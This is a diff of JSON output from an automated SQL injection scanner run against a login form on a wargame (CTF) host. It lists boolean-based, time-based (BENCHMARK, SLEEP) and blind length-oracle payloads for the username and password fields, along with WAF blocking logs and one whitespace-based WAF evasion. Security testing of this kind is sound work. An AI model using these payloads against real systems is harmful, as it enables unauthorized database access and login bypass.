@@ -1,26 +1,43 @@
 {
-  "scanned_at": "2026-09-09T08:44:28.502430+00:00",
+  "scanned_at": "2026-09-10T09:01:14.549358+00:00",
   "total": 2,
   "vulnerabilities": [
     {
       "vuln_type": "SQLi",
       "severity": "HIGH",
-      "url": "http://host3.dreamhack.games:10285/login",
+      "url": "http://host3.dreamhack.games:20643/login",
       "param": "username",
       "method": "POST",
       "surface_type": "form_field",
-      "payload": "' OR (SELECT 1 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #",
-      "evidence": "Time-based SQL Injection | db=MySQL_OR_BENCHMARK",
+      "payload": "' OR '1'='1' #",
+      "evidence": "Boolean-based SQL Injection | db=MySQL",
       "detail": {
-        "type": "Time-based SQL Injection",
-        "detected_db": "MySQL_OR_BENCHMARK",
-        "payload": "' OR (SELECT 1 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #",
-        "baseline_duration": 0.17,
-        "attack_time": 9.7,
-        "verify_time": 0.16,
-        "reproduced_time": 10.12,
+        "type": "Boolean-based SQL Injection",
+        "detected_db": "MySQL",
+        "true_payload": "' OR '1'='1' #",
+        "false_payload": "' OR '1'='2' #",
+        "baseline_len": 1831,
+        "true_response_len": 45,
+        "false_response_len": 65,
+        "page_noise": 0,
+        "noise_threshold": 5,
+        "diff_chars": 57,
         "waf_evaded": false,
-        "waf_hits": [],
+        "waf_hits": [
+          "boolean(true)(\"%' AND 1=1 --\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "boolean(false)(\"%' AND 1=2 --\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "fingerprint(SQLite,true)(\"%' AND sqlite_version() LIKE '%' --\") → 밴 토큰 'like', 우회 불가로 스킵",
+          "fingerprint(SQLite,false)(\"%' AND sqlite_version() LIKE 'XXXXX' --\") → 밴 토큰 'like', 우회 불가로 스킵",
+          "fingerprint(MySQL,true)(\"%' AND @@version_compile_os LIKE '%' #\") → 밴 토큰 'like', 우회 불가로 스킵",
+          "fingerprint(MySQL,false)(\"%' AND @@version_compile_os LIKE 'XXXXX' #\") → 밴 토큰 'like', 우회 불가로 스킵",
+          "fingerprint(PostgreSQL,true)(\"%' AND version() LIKE '%PostgreSQL%' --\") → 밴 토큰 'like', 우회 불가로 스킵",
+          "fingerprint(PostgreSQL,false)(\"%' AND version() LIKE '%XXXXX%' --\") → 밴 토큰 'like', 우회 불가로 스킵",
+          "fingerprint(MSSQL,true)(\"%' AND @@version LIKE '%Microsoft%' --\") → 밴 토큰 'like', 우회 불가로 스킵",
+          "fingerprint(MSSQL,false)(\"%' AND @@version LIKE '%XXXXX%' --\") → 밴 토큰 'like', 우회 불가로 스킵",
+          "enum(ORDER BY 1)(\"' ORDER BY 1 #\") → 밴 토큰 'order', 우회 불가로 스킵",
+          "blind(oracle)(\"' OR (LENGTH(database()) BETWEEN 0 AND 4294967295) LIMIT 1 # \") → 밴 토큰 'database', 우회 불가로 스킵",
+          "blind(oracle)(\"' OR (LENGTH(database()) BETWEEN 1 AND 0) LIMIT 1 # \") → 밴 토큰 'database', 우회 불가로 스킵"
+        ],
         "waf_evasions": [],
         "stateful": false,
         "idem_trace": [
@@ -37,10 +54,6 @@
             "possible": false
           },
           "blind_boolean": {
-            "possible": false,
-            "dialect": null
-          },
-          "blind_time": {
             "possible": true,
             "dialect": "MySQL"
           }
@@ -50,28 +63,45 @@
     {
       "vuln_type": "SQLi",
       "severity": "HIGH",
-      "url": "http://host3.dreamhack.games:10285/login",
+      "url": "http://host3.dreamhack.games:20643/login",
       "param": "password",
       "method": "POST",
       "surface_type": "form_field",
-      "payload": "' OR (SELECT 1 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #",
-      "evidence": "Time-based SQL Injection | db=MySQL_OR_BENCHMARK",
+      "payload": "' OR (SELECT 0 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #",
+      "evidence": "Time-based SQL Injection | db=MySQL",
       "detail": {
         "type": "Time-based SQL Injection",
-        "detected_db": "MySQL_OR_BENCHMARK",
-        "payload": "' OR (SELECT 1 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #",
-        "baseline_duration": 0.17,
-        "attack_time": 10.16,
-        "verify_time": 0.16,
-        "reproduced_time": 10.05,
+        "detected_db": "MySQL",
+        "payload": "' OR (SELECT 0 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #",
+        "baseline_duration": 0.19,
+        "attack_time": 10.11,
+        "verify_time": 0.19,
+        "reproduced_time": 10.09,
         "waf_evaded": false,
         "waf_hits": [
-          "boolean(equiv-false)(\"%' AND 8<3 #\") → 우회 7종 + 조합 전부 실패",
-          "boolean(equiv-true)(\"%' AND 8>3 #\") → 우회 7종 + 조합 전부 실패"
+          "boolean(true)(\"%' AND 1=1 --\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "boolean(false)(\"%' AND 1=2 --\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "boolean(true)(\"%' OR 1=1 LIMIT 1 #\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "boolean(true)(\"%' OR 1=1 LIMIT 1 --\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "boolean(false)(\"%' AND 1=2 #\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "boolean(false)(\"%' OR 1=2 LIMIT 1 #\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "boolean(true)(\"%' AND 1=1 #\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "boolean(false)(\"%' OR 1=2 LIMIT 1 --\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "boolean(true)(\"test%' AND 1=1 --\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "boolean(false)(\"test%' OR 1=2 --\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "boolean(false)(\"test%' AND 1=2 #\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "boolean(true)(\"test%' AND 1=1 #\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "boolean(false)(\"test%' AND 1=2 --\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "boolean(true)(\"test%' OR 1=1 --\") → 밴 토큰 '%', 우회 불가로 스킵",
+          "error/time(MySQL_OR)(\"' OR (SELECT 0 FROM (SELECT SLEEP(5))x) #\") → 밴 토큰 'sleep', 우회 불가로 스킵",
+          "error/time(MySQL_AND)(\"' AND (SELECT 0 FROM (SELECT SLEEP(5))x) #\") → 밴 토큰 'sleep', 우회 불가로 스킵",
+          "enum(ORDER BY 1)(\"' ORDER BY 1 #\") → 밴 토큰 'order', 우회 불가로 스킵",
+          "blind(oracle)(\"' OR (LENGTH(database()) BETWEEN 0 AND 4294967295) LIMIT 1 # \") → 밴 토큰 'database', 우회 불가로 스킵",
+          "blind(oracle)(\"' OR (LENGTH(database()) BETWEEN 1 AND 0) LIMIT 1 # \") → 밴 토큰 'database', 우회 불가로 스킵",
+          "blind-time(oracle)(\"' OR (SELECT 0 FROM (SELECT IF((LENGTH(database()) BETWEEN 0 AND 4294967295),BENCHMARK(3956478,MD5(1)),0))x) # \") → 밴 토큰 'database', 우회 불가로 스킵",
+          "blind-time(oracle)(\"' OR (SELECT 0 FROM (SELECT IF((LENGTH(database()) BETWEEN 1 AND 0),BENCHMARK(3956478,MD5(1)),0))x) # \") → 밴 토큰 'database', 우회 불가로 스킵"
         ],
-        "waf_evasions": [
-          "boolean(false): alt_whitespace 우회 성공 → \"%'\tOR\t1=2\tLIMIT\t1\t#\""
-        ],
+        "waf_evasions": [],
         "stateful": false,
         "idem_trace": [
           0,
@@ -87,8 +117,8 @@
             "possible": false
           },
           "blind_boolean": {
-            "possible": false,
-            "dialect": null
+            "possible": true,
+            "dialect": "MySQL"
           },
           "blind_time": {
             "possible": true,
